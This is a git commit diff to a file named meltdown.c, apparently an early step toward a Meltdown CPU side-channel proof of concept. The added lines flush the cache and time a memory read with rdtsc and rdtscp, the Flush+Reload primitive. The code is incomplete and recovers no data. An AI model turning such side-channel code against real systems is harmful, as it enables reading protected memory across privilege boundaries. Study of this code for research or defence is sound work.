1a6b951aeaf7a647253f2325d6eb7671bc2bfd5f
Gonçalo Ribeiro <darklaw13@yahoo.co.uk>
2018-01-07 20:16:40 +0000

    Flush cache and read TSC register

--- meltdown.c
+++ meltdown.c
@@ -13,6 +13,9 @@ void segfault_handler() {
 int main() {
 
 	unsigned char array[4096*256];
+	unsigned int cycles_high_start, cycles_low_start,
+				 cycles_high_end, cycles_low_end;
+	unsigned long cycles;
 
 	// setup segfault handling
 	struct sigaction segfault_act;
@@ -30,5 +33,30 @@ int main() {
 	asm("mov (%ebx,%eax), %ebx");
 
 end:
+	// puts("receiving end");
+	_mm_clflush(&array);
+
+	// https://stackoverflow.com/a/14214220/2057521
+	asm volatile (
+			"cpuid\n\t"/*serialize*/
+			"rdtsc\n\t"/*read the clock*/
+			"mov %%edx, %0\n\t"
+			"mov %%eax, %1\n\t": "=r" (cycles_high_start), "=r"
+			(cycles_low_start):: "%rax", "%rbx", "%rcx", "%rdx");
+
+	asm("" : : "c"(array[0]));
+
+	asm volatile (
+			"rdtscp\n\t"/*read the clock*/
+			"mov %%edx, %0\n\t"
+			"mov %%eax, %1\n\t"
+			"cpuid\n\t": "=r" (cycles_high_end), "=r"
+			(cycles_low_end):: "%rax", "%rbx", "%rcx", "%rdx");
+
+	cycles = (((unsigned long) cycles_high_end << 32) | cycles_low_end) -
+		((unsigned long) cycles_high_start << 32 | cycles_low_start);
+
+	printf("cycles: %lu\n", cycles);
+
 	return 0;
 }
